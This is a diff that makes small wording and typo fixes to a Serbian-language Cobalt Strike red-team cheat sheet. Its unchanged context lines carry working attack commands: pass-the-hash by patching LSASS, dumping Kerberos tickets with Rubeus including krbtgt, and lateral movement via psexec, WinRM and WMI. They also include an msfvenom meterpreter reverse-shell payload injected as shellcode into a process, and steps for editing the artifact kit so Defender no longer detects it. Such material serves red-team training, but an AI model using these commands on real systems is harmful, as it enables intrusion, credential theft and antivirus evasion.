@@ -8,7 +8,7 @@
 
 ### Peer2Peer Listeners
 
-Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuniciraju preko drugih beacon-a.
+Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuniciraju sa njim preko drugih beacon-a.
 
 `Cobalt Strike -> Listeners -> Add/Edit` zatim treba da odaberete TCP ili SMB beacone
 
@@ -86,7 +86,7 @@ inject [pid] [x64|x86] [listener]
 ## Iz OpSec tačke gledišta: Ne vršite cross-platform injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).
 
 ## Pass the hash
-## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije uvek izvodljivo ako je omogućena Protected Process Light (PPL).
+## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije baš izvodljivo ako je omogućena Protected Process Light (PPL).
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
@@ -113,7 +113,7 @@ steal_token &#x3C;pid>
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Dump interesting ticket by luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
 ### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -125,16 +125,16 @@ steal_token &#x3C;pid>
 # Lateral Movement
 ## Ako je token kreiran, biće korišćen
 jump [method] [target] [listener]
-## Methods:
+## Metode:
 ## psexec                    x86   Koristite servis za pokretanje Service EXE artefakta
 ## psexec64                  x64   Koristite servis za pokretanje Service EXE artefakta
-## psexec_psh                x86   Koristite servis za pokretanje PowerShell one-liner-a
+## psexec_psh                x86   Koristite servis za pokretanje PowerShell one-linera
 ## winrm                     x86   Pokrenite PowerShell skriptu putem WinRM
 ## winrm64                   x64   Pokrenite PowerShell skriptu putem WinRM
 
 remote-exec [method] [target] [command]
-## Methods:
-<strong>## psexec                          Daljinsko izvršavanje putem Service Control Manager-a
+## Metode:
+<strong>## psexec                          Daljinsko izvršavanje putem Service Control Manager
 </strong>## winrm                           Daljinsko izvršavanje putem WinRM (PowerShell)
 ## wmi                             Daljinsko izvršavanje putem WMI
 
@@ -160,7 +160,7 @@ beacon> spawn metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
 ## Pokrenite msfvenom i pripremite multi/handler slušalac
 
-## Kopirajte bin datoteku na cobalt strike host
+## Kopirajte bin fajl na cobalt strike host
 ps
 shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injektujte metasploit shellcode u x64 proces
 
@@ -182,7 +182,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prethodno kompajlirane šablone (u `/src-common`) payload-a koje cobalt strike koristi za generisanje binarnih beacon-a.
 
-Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim šablonom) možete otkriti šta pokreće defender. Obično je to string. Stoga možete samo modifikovati kod koji generiše backdoor tako da taj string ne pojavi u konačnom binarnom fajlu.
+Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim šablonom) možete otkriti šta uzrokuje aktivaciju defendera. Obično je to string. Stoga možete samo modifikovati kod koji generiše backdoor tako da taj string ne pojavi u konačnom binarnom fajlu.
 
 Nakon modifikacije koda, samo pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder u Windows klijent u `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
